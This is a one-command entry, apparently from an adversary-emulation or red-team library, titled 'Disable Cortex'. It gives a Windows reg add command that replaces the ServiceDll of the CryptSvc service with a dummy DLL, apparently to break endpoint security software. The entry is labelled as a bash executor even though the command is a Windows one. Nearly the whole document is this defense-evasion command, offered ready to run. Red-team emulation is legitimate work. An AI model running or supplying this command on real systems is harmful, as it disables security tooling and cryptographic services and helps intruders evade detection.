---
id: 35c51711-8a7d-4548-989b-843ead691e6c
name: Disable Cortex
type: command
executor: bash
data: reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters
  /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f
output: null
created_at: '2023-04-06T03:56:27.632930+00:00'
updated_at: '2023-04-10T20:37:24.287688+00:00'
---

# Disable Cortex

```bash
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f
```


